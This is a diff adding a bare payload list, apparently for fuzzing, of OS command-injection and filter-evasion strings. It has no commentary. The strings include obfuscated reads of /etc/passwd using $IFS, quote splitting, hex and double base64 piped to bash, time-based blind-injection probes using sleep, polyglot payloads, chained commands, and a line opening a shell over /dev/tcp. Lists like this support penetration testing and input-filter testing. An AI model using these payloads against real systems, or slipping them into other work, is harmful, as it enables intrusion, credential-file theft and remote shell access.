@@ -1,0 +1,67 @@
+cat /etc/passwd
+/usr/bin/wh?ami
+/usr/bin/who*mi
+touch -- -la
+ls *
+/usr/bin/who[a]mi
+"w"h"o"a"m"i
+'w'h'o'a'm'i
+\u\n\a\m\e \-\a
+ech''o test
+ech""o test
+/\b\i\n/////s\h
+echo whoami|$0
+cat$u /etc$u/passwd$u
+w${u}h${u}o${u}a${u}m${u}i
+w$(u)h$(u)o$(u)a$(u)m$(u)i
+w`u`h`u`o`u`a`u`m`u`i
+!-1
+mi
+whoa
+!-1!-2
+{whoami}
+{echo,test}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+IFS=,;`cat<<<cat,/etc/passwd`
+IFS=];b=cat]/etc/passwd;$b
+IFS=,;`cat<<<uname,-a`
+echo${IFS}test
+X=$'cat\x20/etc/passwd'&&$X
+w\
+h\
+o\
+a\
+m\
+i
+$u $u
+uname!-1\-a
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+$(cat ${HOME:0:1}etc${HOME:0:1}passwd)
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+cat `xxd -r -p <<< 2f6574632f706173737764`
+xxd -r -ps <(echo 2f6574632f706173737764)
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+echo "echo $(echo 'whoami' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
+echo${IFS}ZDJodllXMXA=|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
+who$@ami
+something%0Acat%20/etc/passwd
+;ls%09-al%09/home
+cat</etc/passwd
+{cat,/etc/passwd}
+X=$'uname\x20-a'&&$X
+sh</dev/tcp/127.0.0.1/4242
+echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+`cat /etc/passwd`
+$(cat /etc/passwd)
+ls | whoami
+ls || whoami
+ls; whoami
+ls && whoami
